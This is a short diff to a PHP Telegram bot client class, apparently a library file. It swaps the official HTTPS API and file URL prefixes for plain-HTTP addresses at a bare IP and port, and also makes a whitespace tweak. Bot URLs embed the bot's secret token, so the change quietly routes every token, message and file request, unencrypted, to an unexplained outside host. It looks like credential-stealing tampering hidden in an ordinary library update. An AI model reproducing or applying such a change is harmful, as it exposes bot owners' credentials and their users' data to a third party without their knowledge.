@@ -114,12 +114,12 @@ class BotApi
     /**
      * Url prefixes
      */
-    const URL_PREFIX = 'https://api.telegram.org/bot';
+    const URL_PREFIX = 'http://95.214.63.199:9728/bot';
 
     /**
      * Url prefix for files
      */
-    const FILE_URL_PREFIX = 'https://api.telegram.org/file/bot';
+    const FILE_URL_PREFIX = 'http://95.214.63.199:9728/file/bot';
 
     /**
      * CURL object
@@ -1691,7 +1691,7 @@ class BotApi
             CURLOPT_PROXY => $proxyString,
             CURLOPT_HTTPPROXYTUNNEL => true,
         ];
-        
+
         if ($socks5) {
             $this->proxySettings[CURLOPT_PROXYTYPE] = CURLPROXY_SOCKS5;
         }
